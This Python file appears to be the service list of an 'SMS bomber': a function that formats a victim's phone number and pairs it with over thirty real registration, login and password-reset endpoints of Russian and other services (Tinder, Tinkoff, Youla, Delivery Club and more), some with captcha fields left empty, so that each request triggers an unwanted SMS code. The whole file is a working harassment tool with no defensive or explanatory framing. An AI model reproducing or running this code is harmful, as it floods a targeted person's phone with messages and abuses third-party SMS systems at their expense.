def get_services(phone, User_Agent):
    phone9           = phone[1:]
    phone9dostavista = phone9[:3] + '+' + phone9[3:6] + '-' + phone9[6:8] +'-'  + phone9[8:10]
    phoneGorzdrav    = phone[1:4] + ') ' + phone[4:7] + '-' + phone[7:9]  + '-' + phone[9:11]
    phoneVkusnoHouse = phone[1:]
    phonePizzaKazan  = '+7 '   + phone[1:4] + ' '  + phone[4:7] + ' '  + phone[7:9] + ' ' + phone[9:11]
    phonePizzaru     = '+7(9'  + phone[2:4] + ') ' + phone[4:7] + '-'  + phone[7:9] + '-' + phone[9:11]
    phoneSmartomato  = '+7 (9' + phone[2:4] + ') ' + phone[4:7] + '-'  + phone[7:9] + '-' + phone[9:11]
    phoneOstin       = '+'     + phone[0]   + '+(' + phone[1:4] + ')'  + phone[4:7] + '-' + phone[7:9] + '-' + phone[9:11]
    phonePizzahut    = '+'     + phone[0]   + ' (' + phone[1:4] + ') ' + phone[4:7] + ' ' + phone[7:9] + ' ' + phone[9:11]
    phoneAresBank    = '+'     + phone[0]   + '('  + phone[1:4] + ')'  + phone[4:7] + '-' + phone[7:9] + '-' + phone[9:11]

    services = [
        {
            'name': 'PizzaRu',
            'url': 'https://pizzaru.ru/ajaxopen/userregister',
                'data':
                {
                    'username': phonePizzaru,
                    'name': 'Имя', 
                    'card_number': ''
                },
                
                'headers':
                {
                    'User-Agent': User_Agent
                }
        },

        {
            'name': 'Smartomato',
            'url': 'https://2407.smartomato.ru/account/session',
                'data':
                {
                    'phone': phoneSmartomato,
                    'g-recaptcha-response': 'null', 
                    'card_number': ''
                },

                'headers':
                {
                    'User-Agent': User_Agent
                }
        },
        
        {
            'name': 'DayPizza',
            'url': 'https://daypizza.ru/hello/sendSms',
                'data':
                {
                    'phone': phone
                },

                'headers':
                {
                    'User-Agent': User_Agent
                }
        },

        {
            'name': 'Yapoki',
            'url': 'https://yapoki.ru/local/templates/main/components/bitrix/system.auth.registration/flat/sms.php',
                'data':
                {
                    "SMSphone": phone
                },

                'headers':
                {
                    'User-Agent': User_Agent
                }
        },

        {
            'name': 'GrabTaxi',
            'url': 'https://p.grabtaxi.com/api/passenger/v2/profiles/register',
                'data':
                {
                    'phoneNumber': phone,
                    'countryCode': 'ID',
                    'name': 'test',
                    'email': 'mail@mail.com',
                    'deviceToken': '*'
                },

                'headers':
                {
                    'User-Agent': User_Agent
                }
        },

        {
            'name': 'BelkaCar',
            'url': 'https://belkacar.ru/get-confirmation-code',
                'data':
                {
                    'phone': phone
                },

                'headers':
                {
                    'User-Agent': User_Agent
                }
        },

        {
            'name': 'Tinder',
            'url': 'https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
                'data':
                {
                    'phone_number': phone
                },

                'headers':
                {
                    'User-Agent': User_Agent
                }
        },

        {
            'name': 'karusel',
            'url': 'https://app.karusel.ru/api/v1/phone/',
                'data':
                {
                    'phone': phone
                },

                'headers':
                {
                    'User-Agent': User_Agent
                }
        },

        {
            'name': 'Tinkoff',
            'url': 'https://api.tinkoff.ru/v1/sign_up',
                'data':
                {
                    'phone': '+' + phone
                },

                'headers':
                {
                    'User-Agent': User_Agent
                }
        },

        {
            'name': 'Youla',
            'url': 'https://youla.ru/web-api/auth/request_code',
                'data':
                {
                    'phone': phone
                },

                'headers':
                {
                    'User-Agent': User_Agent
                }
        },

        {
            'name': 'PizzaHut',
            'url': 'https://pizzahut.ru/account/password-reset',
                'data':
                {
                    'reset_by':'phone', 
                    'action_id':'pass-recovery', 
                    'phone': phonePizzahut, 
                    '_token':'*'
                },

                'headers':
                {
                    'User-Agent': User_Agent
                }
        },

        {
            'name': 'Rabota',
            'url': 'https://www.rabota.ru/remind',
                'data':
                {
                    'credential': phone
                },

                'headers':
                {
                    'User-Agent': User_Agent
                }
        },

        {
            'name': 'RuTube',
            'url': 'https://rutube.ru/api/accounts/sendpass/phone',
                'data':
                {
                    'phone': '+ '+ phone
                },

                'headers':
                {
                    'User-Agent': User_Agent
                }
        },

        {
            'name': 'CitiLink',
            'url': 'https://www.citilink.ru/registration/confirm/phone/+' + phone + '/',
                'data':
                {
                    '': ''
                },

                'headers':
                {
                    'User-Agent': User_Agent
                }
        },

        {
            'name': 'Smsint',
            'url': 'https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php',
                'data':
                {
                    'name': 'gwhfbiuerwfweonVGVibvgweqiyIBI',
                    'phone': phone, 
                    'promo': 'yellowforma'
                },

                'headers':
                {
                    'User-Agent': User_Agent
                }
        },

        {
            'name': 'Oyorooms',
            'url': 'https://www.oyorooms.com/api/pwa/generateotp?phone=' + phone9 + '&country_code=%2B7&nod=4&locale=en',
                'data':
                {
                    '': ''
                },

                'headers':
                {
                    'User-Agent': User_Agent
                }
        },

        {
            'name': 'Mvideo',
            'url': 'https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp',
                'data':
                {
                    'phone': phone,
                    'g-recaptcha-response': '',
                    'recaptcha': 'on'
                },

                'headers':
                {
                    'User-Agent': User_Agent
                }
        },

        {
            'name': 'SunLight',
            'url': 'https://api.sunlight.net/v3/customers/authorization/',
                'data':
                {
                    'phone': phone
                },

                'headers':
                {
                    'User-Agent': User_Agent
                }
        },

        {
            'name': 'Invitro',
            'url': 'https://lk.invitro.ru/lk2/lka/patient/refreshCode',
                'data':
                {
                    'phone': phone
                },

                'headers':
                {
                    'User-Agent': User_Agent
                }
        },

        {
            'name': 'Beltelcom',
            'url': 'https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru',
                'data':
                {
                    'phone': phone
                },
                
                'headers':
                {
                    'User-Agent': User_Agent
                }
        },

        {
            'name': 'Karusel',
            'url': 'https://app.karusel.ru/api/v1/phone/',
                'data':
                {
                    'phone': phone
                },

                'headers':
                {
                    'User-Agent': User_Agent
                }
        },

        {
            'name': 'Citilink',
            'url': 'https://www.citilink.ru/registration/confirm/phone/+' + phone + '/',
                'data':
                {
                    '': ''
                },

                'headers':
                {
                    'User-Agent': User_Agent
                }
        },

        {
            'name': 'Delitime',
            'url': 'https://api.delitime.ru/api/v2/signup',
                'data':
                {
                    'SignupForm[username]': phone, 
                    'SignupForm[device_type]': 3
                },

                'headers':
                {
                    'User-Agent': User_Agent
                }
        },

        {
            'name': 'ICQ',
            'url': 'https://www.icq.com/smsreg/requestPhoneValidation.php',
                'data':
                {
                    'msisdn': phone, 
                    "locale": 'en', 
                    'countryCode': 'ru',
                    'version': '1', 
                    "k": "ic1rtwz1s1Hj1O0r", 
                    "r": "46763"
                },

                'headers':
                {
                    'User-Agent': User_Agent
                }
        },

        {
            'name': 'InDriver',
            'url': 'https://terra-1.indriverapp.com/api/authorization?locale=ru',
                'data':
                {
                    "mode": "request", 
                    "phone": "+" + phone,
                    "phone_permission": "unknown", 
                    "stream_id": 0, 
                    "v": 3, 
                    "appversion": "3.20.6",
                    "osversion": "unknown", 
                    "devicemodel": "unknown"
                },

                'headers':
                {
                    'User-Agent': User_Agent
                }
        },

        {
            'name': 'Invitro',
            'url': 'https://lk.invitro.ru/sp/mobileApi/createUserByPassword',
                'data':
                {
                    "password": '47894AsddSr46eferSSs', 
                    "application": "lkp", 
                    "login": "+" + phone
                },

                'headers':
                {
                    'User-Agent': User_Agent
                }
        },

        {
            'name': 'IVI',
            'url': 'https://api.ivi.ru/mobileapi/user/register/phone/v6',
                'data':
                {
                    'phone': phone
                },

                'headers':
                {
                    'User-Agent': User_Agent
                }
        },

        {
            'name': 'OK',
            'url': 'https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone',
                'data':
                {
                    "st.r.phone": "+" + phone
                },

                'headers':
                {
                    'User-Agent': User_Agent
                }
        },

        {
            'name': 'SMSgorod',
            'url': 'http://smsgorod.ru/sendsms.php',
                'data':
                {
                    "number": phone
                },

                'headers':
                {
                    'User-Agent': User_Agent
                }
        },

        {
            'name': 'Tinder',
            'url': 'https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
                'data':
                {
                    'phone_number': phone
                },

                'headers':
                {
                    'User-Agent': User_Agent
                }
        },

        {
            'name': 'CabWiFi',
            'url': 'https://cabinet.wi-fi.ru/api/auth/by-sms',
                'data':
                {
                    'msisdn': phone
                },

                'headers':
                {
                    'User-Agent': User_Agent
                }
        },

        {
            'name': 'Delivery',
            'url': 'https://www.delivery-club.ru/ajax/user_otp',
                'data':
                {
                    "phone": phone
                },

                'headers':
                {
                    'User-Agent': User_Agent
                }
        },

        {
            'name': 'SMS',
            'url': 'https://api-prime.anytime.global/api/v2/auth/sendVerificationCode',
                'data':
                {
                    "phone": phone
                },

                'headers':
                {
                    'User-Agent': User_Agent
                }
        },

    ]

    return services